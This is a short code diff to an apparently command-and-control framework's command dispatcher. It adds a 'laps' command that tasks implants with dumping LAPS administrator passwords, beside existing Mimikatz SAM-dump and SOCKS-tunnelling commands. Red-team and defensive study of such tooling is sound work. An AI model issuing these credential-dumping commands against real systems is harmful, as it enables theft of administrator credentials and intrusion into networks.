@@ -842,6 +842,10 @@ def runcommand(command, randomuri):
       check_module_loaded("Invoke-Mimikatz.ps1", randomuri)
       new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", randomuri)
 
+    elif (command.lower() == "laps"):
+      check_module_loaded("Get-LAPSPasswords.ps1", randomuri)
+      new_task("Get-LAPSPasswords", randomuri)
+
     elif (command.lower() == "sharpsocks") or (command.lower() == "sharpsocks "):
       check_module_loaded("SharpSocks.ps1", randomuri)
       import string
